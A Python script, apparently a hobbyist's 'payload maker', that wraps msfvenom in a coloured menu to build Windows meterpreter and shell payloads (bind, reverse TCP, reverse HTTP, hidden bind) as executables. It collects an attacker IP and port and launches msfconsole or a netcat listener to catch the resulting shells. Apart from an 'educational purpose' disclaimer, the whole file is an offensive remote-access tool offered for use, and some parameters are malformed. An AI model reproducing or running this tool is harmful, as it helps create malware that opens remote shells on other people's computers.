import subprocess
import os
import time
class Colours:
    white = "\033[1;37m"
    grey = "\033[0;37m"
    purple = "\033[0;35m"
    red = "\033[1;31m"
    green = "\033[1;32m"
    yellow = "\033[1;33m"
    Cyan = "\033[0;36m"
    Cafe = "\033[0;33m"
    Fiuscha = "\033[0;35m"
    blue = "\033[1;34m"


os.system("clear")
try:
    time.sleep(2)
    file = open("Banner4.txt","r")
    if file.mode == "r" :
        contents = file.read()
        print(Colours.red + contents)
except IOError:
    print('Banner File not Found')

print("                                                                                                               --------"+Colours.green+"["+Colours.yellow+"A Tool For Making Payloads]"+Colours.green+"]")
print(Colours.green + "[" + Colours.Cyan + ">" + Colours.green + "]" + "Author      :   M4f1aClow3n")
print(Colours.green + "[" + Colours.Cyan + ">" + Colours.green + "]" + "Instagram   :   https://instagram.com/its_me_abhishek002")
print(Colours.green + "[" + Colours.Cyan + ">" + Colours.green + "]" + "Github      :   https://github.com/M4f1aClow3n/Endangered")
print(Colours.red + "____________________________________________________________________________________________________________________________________")
print(Colours.green + "Important Note :-" )
print(Colours.Cyan + "                   THIS TOOL IS ONLY FOR EDUCATIONAL PURPOSE,FOR ANY ILLEGAL ACTIVITY I M NOT RESPONSIBLE" + Colours.green)
print("")
print(Colours.green + "[" + Colours.Cyan + "*" + Colours.green + "]" +Colours.yellow+"This Tool is able to generate all types of Payloads for Metasploit  :)")
print("")
print(Colours.red + "====================================================================================================================================")
print("")
print(Colours.red + "[" + Colours.green + "1" + Colours.red+"]"+Colours.yellow+"    Bind Shell Payload ")
print(Colours.red + "[" + Colours.green + "2" + Colours.red+"]"+Colours.yellow+"    Reverse_tcp Payload ")
print(Colours.red + "[" + Colours.green + "3" + Colours.red+"]"+Colours.yellow+"    Https Payload")
print(Colours.red + "[" + Colours.green + "4" + Colours.red+"]"+Colours.yellow+"    Hidden Bind TCP Payload ")
print(Colours.red + "[" + Colours.green + "5" + Colours.red+"]"+Colours.yellow+"    Reverse Shell")

print("")
try:
    selector = int(input(Colours.red + "[" + Colours.green +"Select "+Colours.Cyan+"a " +Colours.yellow+ "Number"+Colours.red+"]=====>> "+Colours.green))

    lhost_ip = input(Colours.red + "["+Colours.green+"Enter Your Ip address"+Colours.red+"]====>> "+Colours.green)
    lport = input(Colours.red + "["+Colours.green+"Enter a local port number, suggested 4444"+Colours.red+"]====>> "+Colours.green)
    path = input(Colours.red + "["+Colours.green+"enter the path to save the payload"+Colours.red+"]====>> " +Colours.green)
    if selector == 1:
        print(Colours.red + "[" + Colours.green + "+" + Colours.red + "]" + Colours.yellow + "    Please Wait")
        print(Colours.red + "[" + Colours.green + "+" + Colours.red + "]" + Colours.yellow + "    Initializing")
        subprocess.call(["msfvenom", "-p" ,"windows/meterpreter/bind_tcp", "-f", "exe" ,"-o", path])
        fake1 = "."
        while fake1 <= ".....":
            fake1 = fake1 + "."
            print("\r" + Colours.red + "[" + Colours.green + "+" + Colours.red + "]" + Colours.yellow + "Please Wait" + str(fake1), end="")
            time.sleep(0.5)
        time.sleep(3)
        ask = str(input("\nDo you want to open MsfConsole (y/n)"))
        if ask == "y":
            os.system("clear")
            os.system("msfconsole")
        if ask == "n":
            os.system("python3 peril.py")
    if selector == 2:
        print(Colours.red + "[" + Colours.green + "+" + Colours.red + "]" + Colours.yellow + "    Please Wait")
        print(Colours.red + "[" + Colours.green + "+" + Colours.red + "]" + Colours.yellow + "    Initializing")
        subprocess.call(["msfvenom","-p", "windows/meterpreter/reverse_tcp","lhost="+lhost_ip,"lport="+lport, "-f", "exe", "-o",path])
        fake = "."
        while fake <= ".....":
            fake = fake + "."
            print("\r" + Colours.red + "[" + Colours.green + "+" + Colours.red + "]" + Colours.yellow + "Please Wait" + str(fake), end="")
            time.sleep(0.5)
        time.sleep(3)
        ask1 = str(input("\nDo you want to open MsfConsole (y/n)"))
        if ask1 == "y":
            os.system("clear")
            os.system("msfconsole")
        if ask1 == "n":
            os.system("python3 peril.py")
    if selector == 3:
        print(Colours.red + "[" + Colours.green + "+" + Colours.red + "]" + Colours.yellow + "    Please Wait")
        print(Colours.red + "[" + Colours.green + "+" + Colours.red + "]" + Colours.yellow + "    Initializing")
        subprocess.call(["msfvenom","-p","windows/meterpreter/reverse_http","lhost="+lhost_ip,"lport="+lport,"-f", "exe", "-o",path])
        fake2 = "."
        while fake2 <= ".....":
            fake2 = fake2 + "."
            print("\r" + Colours.red + "[" + Colours.green + "+" + Colours.red + "]" + Colours.yellow + "Please Wait" + str(fake2), end="")
            time.sleep(0.5)
        time.sleep(3)
        ask2 = str(input("\nDo you want to open MsfConsole (y/n)"))
        if ask2 == "y":
            os.system("clear")
            os.system("msfconsole")
        if ask2 == "n":
            os.system("python3 peril.py")
    if selector == 4:
        print(Colours.red + "[" + Colours.green + "+" + Colours.red + "]" + Colours.yellow + "    Please Wait")
        print(Colours.red + "[" + Colours.green + "+" + Colours.red + "]" + Colours.yellow + "    Initializing")
        subprocess.call(["msfvenom", "-p","windows/shell_hidden_bind_tcp","ahost="+lhost_ip,"lport="+lport, "-f", "exe", "-o", path])
        fake3 = "."
        while fake3 <= "......":
            fake3 = fake3 + "."
            print("\r" + Colours.red + "[" + Colours.green + "+" + Colours.red + "]" + Colours.yellow + "Please Wait" + str(fake3), end="")
            time.sleep(0.5)
        time.sleep(3)
        ask3 = str(input("\nDo you want to open Netcat (y/n)"))
        if ask3 == "y":
            os.system("clear")
            subprocess.call(["nc", lhost_ip, lport ])
        if ask3 == "n":
            os.system("python3 peril.py")
    if selector == 5:
        print(Colours.red + "[" + Colours.green + "+" + Colours.red + "]" + Colours.yellow + "    Please Wait")
        print(Colours.red + "[" + Colours.green + "+" + Colours.red + "]" + Colours.yellow + "    Initializing")
        subprocess.call(["msfvenom", "-p","windows/shell_reverse_tcp", "ahost="+lhost_ip,"lport="+lport, "-f", "exe", "-o", path])
        fake4 = "."
        while fake4 <= ".....":
            fake4 = fake4 + "."
            print("\r" + Colours.red + "[" + Colours.green + "+" + Colours.red + "]" + Colours.yellow + "Please Wait" + str(fake4), end="")
            time.sleep(0.5)
        time.sleep(3)
        ask4 = str(input("\nDo you want to open Netcat (y/n)"))
        if ask4 == "y":
            os.system("clear")
            subprocess.call(["nc", "-lvp", lport])
        if ask4 == "n":
            os.system("python3 peril.py")
    if selector >= 6:
        print(Colours.red+"["+Colours.yellow+"-"+Colours.red+"]"+Colours.red+"    Please choose a correct option")
except KeyboardInterrupt:
    print(Colours.yellow + "\nCool Attitude Man!!"+Colours.green+"\nBye")
